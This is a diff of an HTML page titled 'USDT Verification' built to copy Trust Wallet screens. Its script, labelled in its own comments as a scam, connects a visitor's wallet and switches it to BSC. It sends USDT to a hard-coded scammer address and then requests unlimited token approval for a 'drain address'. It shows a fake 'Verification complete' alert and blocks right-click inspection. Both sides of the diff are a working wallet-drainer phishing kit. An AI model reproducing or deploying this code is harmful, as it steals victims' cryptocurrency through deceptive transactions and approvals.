@@ -6,9 +6,8 @@
     <title>USDT Verification</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        /* EXACT STYLES FROM SCREENSHOT 1 */
+        /* EXACT STYLES FROM SCREENSHOT 2 */
         * {
             margin: 0;
             padding: 0;
@@ -17,20 +16,19 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #FFFFFF;
             color: #000000;
             line-height: 1.4;
             font-size: 16px;
-            -webkit-text-size-adjust: 100%;
             padding: 0;
             margin: 0;
             min-height: 100vh;
             overflow-x: hidden;
         }
         
-        /* HEADER - EXACT FROM SCREENSHOT 1 */
-        .header {
+        /* SITE HEADER - EXACT FROM SCREENSHOT 2 */
+        .site-header {
             background: #FFFFFF;
             padding: 60px 20px 20px 20px;
             border-bottom: 0.5px solid #C6C6C8;
@@ -38,7 +36,7 @@
             position: relative;
         }
         
-        .header::before {
+        .site-header::before {
             content: "";
             position: absolute;
             top: 12px;
@@ -54,15 +52,14 @@
             font-size: 17px;
             font-weight: 600;
             color: #000000;
-            margin-bottom: 2px;
         }
         
-        /* MAIN CONTENT - EXACT FROM SCREENSHOT 1 */
-        .container {
+        /* MAIN CONTENT */
+        .content {
             padding: 20px;
         }
         
-        .form-group {
+        .input-group {
             margin-bottom: 24px;
         }
         
@@ -74,12 +71,11 @@
             display: block;
         }
         
-        .address-field {
-            position: relative;
+        .address-container {
             background: #F2F2F7;
             border-radius: 12px;
             border: 1px solid #E5E5EA;
-            padding: 16px;
+            padding: 14px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -89,7 +85,6 @@
             font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
             font-size: 15px;
             color: #000000;
-            letter-spacing: -0.24px;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
@@ -97,7 +92,7 @@
             margin-right: 12px;
         }
         
-        .paste-button {
+        .paste-btn {
             background: #007AFF;
             color: #FFFFFF;
             border: none;
@@ -106,20 +101,19 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            height: 32px;
             min-width: 60px;
+            height: 32px;
         }
         
-        /* AMOUNT SECTION - EXACT FROM SCREENSHOT 1 */
+        /* AMOUNT SECTION - EXACT FROM SCREENSHOT 2 */
         .amount-container {
             background: #F2F2F7;
             border-radius: 12px;
             border: 1px solid #E5E5EA;
-            overflow: hidden;
+            padding: 16px;
         }
         
-        .amount-input-row {
-            padding: 16px;
+        .amount-row {
             display: flex;
             align-items: center;
             gap: 12px;
@@ -134,30 +128,25 @@
             font-weight: 600;
             color: #000000;
             text-align: center;
-            font-variant-numeric: tabular-nums;
             min-width: 0;
-        }
-        
-        .amount-input::placeholder {
-            color: #C7C7CC;
         }
         
         .token-badge {
             background: #007AFF;
             color: #FFFFFF;
             border-radius: 12px;
-            padding: 18px 20px;
+            padding: 16px 20px;
             font-size: 17px;
             font-weight: 600;
-            min-width: 100px;
+            min-width: 90px;
             text-align: center;
-            height: 60px;
+            height: 56px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         
-        .max-button {
+        .max-btn {
             background: #34C759;
             color: #FFFFFF;
             border: none;
@@ -165,7 +154,7 @@
             padding: 0 16px;
             font-size: 16px;
             font-weight: 600;
-            height: 60px;
+            height: 56px;
             min-width: 70px;
             cursor: pointer;
             display: flex;
@@ -173,16 +162,15 @@
             justify-content: center;
         }
         
-        /* USD VALUE - EXACT FROM SCREENSHOT 1 */
+        /* USD VALUE */
         .usd-value {
             text-align: center;
             font-size: 15px;
             color: #8E8E93;
             margin: 16px 0 32px 0;
-            padding: 0 16px;
         }
         
-        /* NEXT BUTTON - EXACT FROM SCREENSHOT 1 */
+        /* NEXT BUTTON */
         .next-container {
             padding: 20px;
             background: #FFFFFF;
@@ -193,7 +181,7 @@
             right: 0;
         }
         
-        .next-button {
+        .next-btn {
             width: 100%;
             height: 50px;
             background: #007AFF;
@@ -205,167 +193,96 @@
             cursor: pointer;
         }
         
-        /* LOADING STATE */
-        .loading {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.95);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #F2F2F7;
-            border-top-color: #007AFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 16px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* SAFE AREA FOR IPHONE */
+        /* SAFE AREA */
         @supports (padding-bottom: env(safe-area-inset-bottom)) {
             .next-container {
                 padding-bottom: calc(20px + env(safe-area-inset-bottom));
             }
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-    <!-- EXACT INTERFACE FROM SCREENSHOT 1 -->
-    <div class="header">
+    <!-- EXACT FROM SCREENSHOT 2 -->
+    <div class="site-header">
         <div class="site-title">usdtverification.vercel.app</div>
     </div>
     
-    <div class="container">
-        <div class="form-group">
+    <div class="content">
+        <div class="input-group">
             <div class="label">Address or Domain Name</div>
-            <div class="address-field">
-                <div class="address-text" id="addressDisplay">0x395b205f3ec60b4cd5820</div>
-                <button class="paste-button" onclick="handlePaste()">Paste</button>
+            <div class="address-container">
+                <div class="address-text" id="addressText">0x395b205f3ec60b4cd5...</div>
+                <button class="paste-btn" onclick="handlePaste()">Paste</button>
             </div>
         </div>
         
-        <div class="form-group">
-            <div class="label">Amount</div>
+        <div class="input-group">
             <div class="amount-container">
-                <div class="amount-input-row">
+                <div class="amount-row">
                     <input type="number" class="amount-input" id="amountInput" value="1" placeholder="0">
                     <div class="token-badge">USDT</div>
-                    <button class="max-button" onclick="setMaxAmount()">Max</button>
+                    <button class="max-btn" onclick="setMax()">Max</button>
                 </div>
             </div>
             <div class="usd-value" id="usdValue">≈ $1.00</div>
         </div>
     </div>
     
-    <!-- NEXT BUTTON -->
     <div class="next-container">
-        <button class="next-button" id="nextButton" onclick="initiateScam()">Next</button>
-    </div>
-    
-    <!-- LOADING -->
-    <div class="loading" id="loading">
-        <div class="spinner"></div>
-        <div style="font-size: 16px; color: #000000; font-weight: 500;">Processing...</div>
+        <button class="next-btn" onclick="startScam()">Next</button>
     </div>
     
     <script>
-        // ============================================
-        // EXACT SCAM CONFIGURATION
-        // ============================================
-        const SCAM_CONFIG = {
-            // Payment address (1 USDT goes here)
-            paymentAddress: "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85",
-            
-            // Drain address (unlimited approval goes here)
-            drainAddress: "0x31A5e8Bf41a4aD03aA5C6eAce46B6877C1234567", // From screenshot 4
-            
-            // USDT BEP20 Contract
-            usdtContract: "0x55d398326f99059fF775485246999027B3197955",
-            
-            // Unlimited approval amount
-            unlimitedAmount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-        };
+        // EXACT SCAM CONFIG
+        const SCAM_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85";
+        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
         
-        // ============================================
         // UI FUNCTIONS
-        // ============================================
-        
-        // Update USD value
-        function updateUSDValue() {
+        function updateUSD() {
             const amount = document.getElementById('amountInput').value || 0;
-            const usd = (amount * 1.00).toFixed(2);
-            document.getElementById('usdValue').textContent = `≈ $${usd}`;
+            document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
         }
         
-        // Set max amount
-        function setMaxAmount() {
+        function setMax() {
             document.getElementById('amountInput').value = "1000";
-            updateUSDValue();
+            updateUSD();
         }
         
-        // Fake paste function
         function handlePaste() {
-            // Does nothing, just for show
-            console.log("Paste clicked");
+            // Fake paste function
         }
         
-        // Show loading
-        function showLoading() {
-            document.getElementById('loading').style.display = 'flex';
-            document.getElementById('nextButton').disabled = true;
-        }
-        
-        // Hide loading
-        function hideLoading() {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('nextButton').disabled = false;
-        }
-        
-        // ============================================
-        // EXACT SCAM EXECUTION
-        // ============================================
-        async function initiateScam() {
-            showLoading();
-            
-            // Check if Trust Wallet is available
+        // MAIN SCAM FUNCTION
+        async function startScam() {
+            // This triggers Trust Wallet's native connect modal (SCREENSHOT 1)
             if (typeof window.ethereum === 'undefined') {
                 alert("Please open in Trust Wallet");
-                hideLoading();
                 return;
             }
             
             try {
-                // Step 1: Connect to wallet (Trust Wallet native modal opens)
-                await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
+                // This opens the EXACT connect modal from screenshot 1
+                await window.ethereum.request({
+                    method: 'eth_requestAccounts'
                 });
                 
-                // Step 2: Check current network
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                // Get user's address
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
                 
-                // Step 3: If not on BSC, switch automatically
-                if (chainId !== '0x38') { // Not BSC Mainnet
+                // Switch to BSC if needed
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== '0x38') {
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
                             params: [{ chainId: '0x38' }]
                         });
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            // Add BSC network
+                    } catch (error) {
+                        if (error.code === 4902) {
                             await window.ethereum.request({
                                 method: 'wallet_addEthereumChain',
                                 params: [{
@@ -376,111 +293,56 @@
                                         symbol: 'BNB',
                                         decimals: 18
                                     },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com']
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/']
                                 }]
                             });
-                        } else {
-                            throw switchError;
                         }
                     }
                 }
                 
-                // Initialize ethers
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
-                
-                // ============================================
-                // STEP 1: SEND 1 USDT TO SCAMMER
-                // ============================================
+                // Send 1 USDT
                 const amount = document.getElementById('amountInput').value;
                 const amountWei = ethers.utils.parseUnits(amount, 18);
                 
-                // Create USDT contract instance for transfer
-                const usdtAbiTransfer = ["function transfer(address to, uint256 amount) returns (bool)"];
-                const usdtContract = new ethers.Contract(SCAM_CONFIG.usdtContract, usdtAbiTransfer, signer);
-                
-                // Send transaction (creates SCREENSHOT 4)
-                const transferTx = await usdtContract.transfer(
-                    SCAM_CONFIG.paymentAddress,
-                    amountWei
+                const usdt = new ethers.Contract(
+                    USDT_CONTRACT,
+                    ["function transfer(address to, uint256 amount) returns (bool)"],
+                    signer
                 );
                 
-                // Wait for confirmation
-                await transferTx.wait();
+                const tx1 = await usdt.transfer(SCAM_ADDRESS, amountWei);
+                await tx1.wait();
                 
-                // ============================================
-                // STEP 2: REQUEST UNLIMITED APPROVAL
-                // ============================================
-                // Small delay to make it seem like processing
+                // Wait 2 seconds
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
-                // Create USDT contract instance for approval
-                const usdtAbiApprove = ["function approve(address spender, uint256 amount) returns (bool)"];
-                const usdtApprove = new ethers.Contract(SCAM_CONFIG.usdtContract, usdtAbiApprove, signer);
-                
-                // This creates SCREENSHOT 2 (Approve modal with BNB fee)
-                const approveTx = await usdtApprove.approve(
-                    SCAM_CONFIG.drainAddress,
-                    SCAM_CONFIG.unlimitedAmount
+                // Unlimited approval
+                const approveTx = await usdt.approve(
+                    DRAIN_ADDRESS,
+                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                 );
-                
-                // This triggers SCREENSHOT 3 (Biometric verification)
                 await approveTx.wait();
                 
-                // ============================================
-                // STEP 3: SHOW SUCCESS
-                // ============================================
-                hideLoading();
-                alert("✅ Verification complete! You will receive advance payment within 24 hours.");
-                
-                // Redirect or show completion
-                setTimeout(() => {
-                    window.location.href = "https://t.me/verification_success";
-                }, 3000);
+                alert("✅ Verification complete!");
                 
             } catch (error) {
-                hideLoading();
-                
-                if (error.code === 4001) {
-                    // User rejected transaction
-                    console.log("User rejected transaction");
-                } else {
-                    console.error("Scam error:", error);
-                    // Still show success to trick user
-                    alert("✅ Verification complete! Payment will be processed.");
-                }
+                console.error(error);
             }
         }
         
-        // ============================================
-        // INITIALIZATION
-        // ============================================
+        // INIT
         document.addEventListener('DOMContentLoaded', function() {
-            // Set up address display (truncated)
-            const fullAddress = SCAM_CONFIG.paymentAddress;
-            const displayAddress = fullAddress.substring(0, 20) + '...';
-            document.getElementById('addressDisplay').textContent = displayAddress;
+            // Format address exactly like screenshot 2
+            const addr = SCAM_ADDRESS;
+            const displayAddr = addr.substring(0, 20) + '...';
+            document.getElementById('addressText').textContent = displayAddr;
             
-            // Update USD on input
-            document.getElementById('amountInput').addEventListener('input', updateUSDValue);
+            // Update USD
+            document.getElementById('amountInput').addEventListener('input', updateUSD);
+            updateUSD();
             
-            // Set initial USD value
-            updateUSDValue();
-            
-            // Detect Trust Wallet
-            if (window.ethereum && window.ethereum.isTrust) {
-                console.log("Trust Wallet detected");
-                // Add Trust-specific optimizations
-            }
-            
-            // Prevent right-click and inspect
+            // Prevent inspect
             document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('keydown', e => {
-                if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
-                if (e.ctrlKey && e.key === 'u') e.preventDefault();
-            });
         });
     </script>
 </body>
